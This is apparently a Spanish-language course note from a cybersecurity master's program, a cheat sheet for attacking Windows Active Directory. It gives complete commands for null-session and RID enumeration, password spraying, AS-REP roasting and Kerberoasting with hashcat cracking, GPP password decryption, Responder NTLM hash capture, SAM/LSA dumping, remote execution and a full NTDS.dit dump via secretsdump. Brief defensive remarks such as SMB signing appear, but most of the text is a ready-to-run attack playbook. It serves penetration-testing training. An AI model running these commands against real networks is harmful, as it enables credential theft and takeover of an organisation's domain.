> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 08 — Active Directory
> **Contenido:** BloodHound, enumeración con NetExec, Kerberoasting, AS-REP Roasting, GPP y Responder — comandos completos

---

## ① Conceptos esenciales

Active Directory (AD) centraliza usuarios, grupos, equipos y políticas de una red corporativa Windows. El **Domain Controller (DC)** es el servidor que sostiene el dominio.

### Tres activos críticos

| Activo | Contenido |
|--------|-----------|
| **NTDS.dit** | Base de datos del dominio con hashes de todo el dominio |
| **SAM** | Cuentas locales de un equipo concreto |
| **LSA Secrets** | Credenciales cacheadas por el subsistema de seguridad de Windows |

### Puertos que delatan un DC

| Puerto | Servicio |
|--------|----------|
| 53 | DNS |
| 88 | Kerberos |
| 389/636 | LDAP/LDAPS |
| 445 | SMB |

---

## ② Fase 0 — sin credenciales: primera cuenta del dominio

### Enumeración inicial y null session

```bash
nmap -p 53,88,389,445,636 <IP_DC>

# Null session / enumeración SMB sin credenciales
smbclient -L //<IP_DC>/ -N
smbclient //<IP_DC>/replication -N

# Con NetExec (nxc), la navaja suiza de AD:
nxc smb <IP_DC> -u '' -p '' --shares
nxc smb <IP_DC> -u 'guest' -p '' --users
```

### RID Brute (cuando `--users` no devuelve nada)

```bash
nxc smb <IP_DC> -u '' -p '' --rid-brute

# Filtrar solo usuarios de la salida:
nxc smb <IP_DC> -u '' -p '' --rid-brute | grep "SidType User" \
 | awk -F '\\' '{ print $2 }' | awk '{ print $1 }' > users.txt
```

### Password spraying con la lista de usuarios obtenida

```bash
nxc smb <IP_DC> -u users.txt -p 'Password123' --no-brute force
```

### Kerbrute para validar existencia de usuarios sin bloquear cuentas

```bash
kerbrute userenum --dc <IP_DC> -d dominio.local users.txt
```

### AS-REP Roasting (no requiere credenciales, solo lista de usuarios)

```bash
# Si algún usuario tiene desactivada la preautenticación Kerberos:
impacket-GetNPUsers dominio.local/ -usersfile users.txt -no-pass \
 -format hashcat -outputfile asrep_hashes.txt

# Crackear offline:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## ③ Fase 1 — con una cuenta válida

### Enumeración autenticada con ldapdomaindump

```bash
ldapdomaindump -u 'dominio.local\usuario' -p 'contrasena' <IP_DC>
# Genera HTML/JSON con usuarios (incluidas descripciones → a veces
# contienen contraseñas filtradas por error humano), equipos, grupos
```

### BloodHound: mapear el camino más corto a Domain Admin

```bash
# Recolección de datos (bloodhound-python funciona desde Linux):
bloodhound-python -u 'usuario' -p 'contrasena' -d dominio.local \
 -ns <IP_DC> -c All

# Cargar los .json resultantes en la interfaz de BloodHound
# y usar la consulta predefinida "Shortest Paths to Domain Admins"
```

### Kerberoasting (requiere cuenta válida)

```bash
impacket-GetUserSPNs dominio.local/usuario:contrasena -dc-ip <IP_DC> \
 -request -outputfile spn_hashes.txt

hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

> [!warning] Riesgo de Kerberoasting
> Es especialmente alto cuando el servicio con SPN está asociado, por comodidad administrativa, a una cuenta con privilegios elevados (incluso Domain Admin) en lugar de a una cuenta de servicio dedicada.

---

## ④ GPP Passwords en SYSVOL

```bash
# Buscar Groups.xml en el share replication/SYSVOL
smbclient //<IP_DC>/replication -N
# dentro: cd Policies, buscar rutas tipo
# Machine/Preferences/Groups/Groups.xml
get Groups.xml

# Descifrar el campo cpassword (la clave AES de Microsoft se filtró):
gpp-decrypt "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA..."
```

---

## ⑤ Responder: captura de hashes NTLM

```bash
sudo responder -I eth0

# Cuando un cliente Windows busca un recurso que no existe
# (\\SERVIDOR\recurso) y pregunta por difusión, Responder contesta
# "soy yo" y captura el hash NTLMv2 en un archivo tipo
# /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# Crackear el hash capturado offline:
hashcat -m 5600 hash_capturado.txt /usr/share/wordlists/rockyou.txt
```

> [!important] Vector incluso sin credenciales previas
> Este vector funciona incluso sin credenciales previas (fase 0). La defensa principal es activar **SMB Signing** de forma obligatoria, dificultando la reutilización de la autenticación capturada (ataques de relay).

---

## ⑥ Movimiento con credenciales validadas

```bash
# Comprobar en qué máquinas el usuario obtenido es admin local:
nxc smb 192.168.10.0/24 -u usuario -p 'contrasena'
# Los resultados marcados como (Pwn3d!) indican admin local en ese host

# Volcar SAM/LSA en una máquina donde ya somos admin:
nxc smb <IP> -u usuario -p 'contrasena' --sam
nxc smb <IP> -u usuario -p 'contrasena' --lsa

# Ejecutar comandos remotos con WMI/SMB:
impacket-wmiexec dominio.local/usuario:contrasena@<IP>
impacket-psexec dominio.local/usuario:contrasena@<IP>
```

> [!tip] El "baile de credenciales"
> El progreso en AD se describe como un ciclo: se compromete un equipo → se extraen credenciales → se prueban en otras máquinas → se repite hasta alcanzar Domain Admin y volcar NTDS.dit completo:

```bash
impacket-secretsdump dominio.local/administrador:contrasena@<IP_DC>
```
